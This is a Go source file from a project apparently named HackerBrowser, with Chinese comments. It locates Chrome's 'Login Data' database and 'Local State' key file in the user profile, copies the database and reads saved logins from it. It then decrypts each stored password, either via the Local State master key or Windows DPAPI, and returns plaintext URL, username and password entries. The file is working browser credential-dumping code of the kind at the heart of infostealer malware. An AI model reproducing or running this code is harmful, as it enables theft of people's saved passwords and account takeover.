package core

import (
	"HackerBrowser/crypher"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"os"
)

/*
	这个文件来获取Chrome的配置信息
*/
const (
	chromeprofilepath = `/AppData/Local/Google/Chrome/User Data/Default/Login Data` // 默认解密文件路径
	chromekeypath = `/AppData/Local/Google/Chrome/User Data/Local State` // 默认解密用key存储文件路径
)


type ChromeInit struct {
	ProfilePath string
	KeyPath string
}

type ChromeData struct {
	Url string
	UserName string
	PassWord string
}

func (c *ChromeInit) InitProfile(MainProfile string) string{
	// 返回Profile的路径
	if MainProfile != "" {
		return MainProfile
	}else{
		return os.Getenv("USERPROFILE") + chromeprofilepath
	}
}

func (c *ChromeInit) InitKey(MainKey string) string{
	// 返回解密用的key的文件路径
	if MainKey != ""{
		return MainKey
	}else{
		return os.Getenv("USERPROFILE")+ chromekeypath
	}
}

func (c *ChromeInit) ReturnData8() ([]ChromeData,error) {
	var data ChromeData
	var chromeDataList []ChromeData

	conn, err := sql.Open("sqlite3","ChromeDB")
	if err != nil {
		return []ChromeData{} ,err
	}
	if conn != nil{
		rows, err :=  conn.Query(`SELECT origin_url, username_value, password_value FROM logins`)
		if err != nil {
			return []ChromeData{},err
		}
		defer func() {
			_ = rows.Close()
		}()
		for rows.Next() {
			var url string
			var username string
			var password []byte
			err := rows.Scan(&url,&username,&password)
			if err != nil{
				continue
			}
			masterKey, err := crypher.ReturnKeyFromLocalState(c.KeyPath)
			if err != nil {
				continue
			}
			depwd, err := crypher.DecryptPwd(password,masterKey)
			if err != nil {
				continue
			}
			if username == "" || string(depwd) == ""{
				continue
			}else{
				data = ChromeData{
					Url: url,
					UserName: username,
					PassWord: string(depwd),
				}
				chromeDataList = append(chromeDataList, data)
			}
		}
	}
	return chromeDataList,nil
}
func (c *ChromeInit) ReturnData() ([]ChromeData,error) {
	var data ChromeData
	var chromeDataList []ChromeData

	conn, err := sql.Open("sqlite3","ChromeDB")
	if err != nil {
		return []ChromeData{} ,err
	}
	if conn != nil{
		rows, err :=  conn.Query(`SELECT origin_url, username_value, password_value FROM logins`)
		if err != nil {
			return []ChromeData{},err
		}
		defer func() {
			_ = rows.Close()
		}()
		for rows.Next() {
			var url string
			var username string
			var password []byte
			err := rows.Scan(&url,&username,&password)
			if err != nil{
				continue
			}
			depwd, err :=crypher.WinDecypt(password)
			if err != nil {
				continue
			}
			if username == "" || string(depwd) == ""{
				continue
			}else{
				data = ChromeData{
					Url: url,
					UserName: username,
					PassWord: string(depwd),
				}
				chromeDataList = append(chromeDataList, data)
			}
		}
	}
	return chromeDataList,nil
}

func (c *ChromeInit) CopyFile()bool {
	if c.ProfilePath != ""{
		source_open, err := os.Open(c.ProfilePath)
		if err != nil {
			return false
		}
		defer source_open.Close()

		dest_open, err := os.OpenFile("ChromeDB", os.O_CREATE|os.O_WRONLY, 644)
		if err != nil {
			return false
		}
		defer dest_open.Close()
		_, copy_err := io.Copy(dest_open,source_open)
		if copy_err != nil{
			return false
		}else{
			return true
		}
	}else{
		return false
	}
}
